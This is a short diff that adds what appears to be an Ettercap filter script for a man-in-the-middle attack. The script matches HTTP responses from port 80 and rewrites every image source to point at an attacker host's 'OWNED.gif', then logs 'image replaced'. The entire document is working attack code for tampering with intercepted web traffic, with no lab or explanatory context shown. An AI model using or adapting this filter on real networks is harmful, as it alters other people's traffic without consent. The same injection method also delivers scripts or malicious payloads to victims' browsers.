@@ -1,0 +1,4 @@
+if (ip.proto == TCP && tcp.src == 80) {
+   replace("img src=", "img src=\"http://skeena/OWNED.gif \" ");
+ msg("image replaced\n");
+}
